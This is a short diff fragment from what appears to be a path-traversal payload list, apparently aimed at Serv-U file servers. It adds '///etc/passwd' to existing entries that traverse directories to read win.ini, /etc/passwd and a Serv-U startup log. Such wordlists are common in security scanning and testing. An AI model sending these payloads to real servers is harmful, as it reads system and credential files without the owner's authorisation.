@@ -2,3 +2,4 @@
 /../../../../windows&InternalFile=win.ini
 \\..\\..\\..\\etc&InternalFile=passwd
 /../../../../ProgramData/RhinoSoft/Serv-U/&InternalFile=Serv-U-StartupLog.txt
+///etc/passwd
